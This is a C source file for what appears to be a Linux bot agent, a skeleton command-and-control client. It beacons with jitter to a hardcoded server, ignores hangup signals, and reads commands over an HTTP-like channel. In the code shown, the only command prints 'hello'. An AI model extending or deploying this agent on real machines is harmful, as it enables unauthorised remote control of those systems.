/*=======================================*/
// [ OWNER ]
//     CREATOR  : Vladislav Khudash
//     AGE      : 18
//     LOCATION : Ukraine
//
// [ PINFO ]
//     DATE     : 09.11.2026
//     PROJECT  : LINUX-BOT (AGENT)
//     PLATFORM : LINUX (x86_64)
/*=======================================*/


/* GitHub: https://github.com/vk-candpython/linbot

REQUIREMENTS (
    Сompiler : GCC (GNU)
    Support  : x86_64 Linux (ELF64)
)

https://github.com/vk-candpython/linbot/blob/main/agent.h

INTERNAL AGENT DECLARATIONS */
#include "agent.h"




/* base ± mask/2 ms. mask = 2^n - 1. Requires base >= mask/2. */
DEC_FUNC(ULONG) delay_jitter(ULONG *const seed, const ULONG base, const ULONG mask) {
    *seed = (*seed * 6364136223846793005UL) + 1442695040888963407UL;
    return (base - (mask >> 1)) + (*seed & mask);
}




#define BODY_IO_OP_(io_op) {                                    \
    LONG total = 0;                                             \
                                                                \
    while (total < size) {                                      \
        const LONG n = io_op(fd, buf + total, size - total);    \
                                                                \
        if (UNLIKELY_(n == -EINTR)) continue;                   \
        if (UNLIKELY_(n <= 0L    )) return FALSE;               \
                                                                \
        total += n;                                             \
    }                                                           \
                                                                \
    return TRUE;                                                \
}

DEC_FUNC(BOOLEAN) read_full(const LONG fd, BYTE *const buf, const LONG size)
    BODY_IO_OP_(read)

DEC_FUNC(BOOLEAN) write_full(const LONG fd, CONST_PTR(BYTE) buf, const LONG size)
    BODY_IO_OP_(write)

#undef BODY_IO_OP_




DEC_FUNC(BOOLEAN) send_GET(const LONG sockFd) {
    static const BYTE hdrGet[] = BOT_HDR_HTTP_GET;
    return write_full(sockFd, hdrGet, sizeof(hdrGet) - 1);
}





DEC_FUNC(CMDSZ) parse_cmd_int(const BYTE *ptr) {
    CMDSZ val = 0;

    while (LIKELY_((*ptr >= '0') and (*ptr <= '9')))
        val = (val * 10) + (*ptr++ - '0');

    return val;
}


DEC_FUNC(CMDSZ) recv_cmd(const LONG sockFd) {
    static BYTE hdr[SIZE_HTTP_HDR_CMD];

    /* */
    if (not read_full(sockFd, hdr, SIZE_HTTP_HDR_CMD) or
        (LOAD_INT_(hdr,      UINT32) != 0x50545448) or
        (LOAD_INT_(hdr + 13, UINT16) != 0x4B4F)
    ) return 0;

    return parse_cmd_int(hdr + 9);
}




DEC_FUNC(VOID) Dispatcher(const LONG sockFd) {
    while (TRUE) {
        if (not send_GET(sockFd)) return;

        CMDSZ cmd = recv_cmd(sockFd);
        if (not cmd) return;


        if (cmd == 200) write(1, "hello\n", 6);
    }
}




DEC_FUNC(BOOLEAN) ignore_sig(const LONG signum) {
    const kernel_sigaction_t sa = {.sa_handler = SIG_IGN};
    return SYSOK(rt_sigaction(signum, &sa, NULL, sizeof(sa.sa_mask)));
}




/*
/===========================\
 *     BOT-ENTRY-POINT     *
\===========================/
*/
GCC_ATTR_(noreturn, visibility("hidden"))
VOID Main(VOID) {
    ignore_sig(SIGHUP );
    ignore_sig(SIGPIPE);
    ignore_sig(SIGCHLD);



    ULONG seedJitter = 0x243F6A8885A308D3UL; // Fractional part of Pi
    getrandom(&seedJitter, sizeof(seedJitter), GRND_NONBLOCK);

    LONG sockFd;
    const sockaddr_in_t sockHost = {
        .sin_family = AF_INET,
        .sin_port   = htons(BOT_SERVER_PORT),
        .sin_addr   = BOT_SERVER_IPV4,
    };


    while (TRUE) {
        const ULONG delayMs = delay_jitter(&seedJitter,
            SOCK_RETRY_DELAY, SOCK_RETRY_MASK);

        if (SYSOK(sockFd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP))) {
            if (SYSOK(connect(sockFd, &sockHost, sizeof(sockaddr_in_t))))
                Dispatcher(sockFd);

            close(sockFd);
        }

        sys_sleep_ms(delayMs);
    }

    UNREACHABLE_();
}


/* ELF Process Entry Point: transfer control to Main (no arguments) */
GCC_ATTR_(naked, noreturn, visibility("hidden"))
VOID _start(VOID) {
    GCC_ASM_ (
        "andq $-16, %rsp\n\t" // 1. Enforce 16-byte stack alignment
        "subq $8,   %rsp\n\t" // 2. Align stack for SysV AMD64 function entry
        "jmp Main\n\t"        // 3. Direct PC-relative jump (PIE-safe)
    );
    UNREACHABLE_();
}
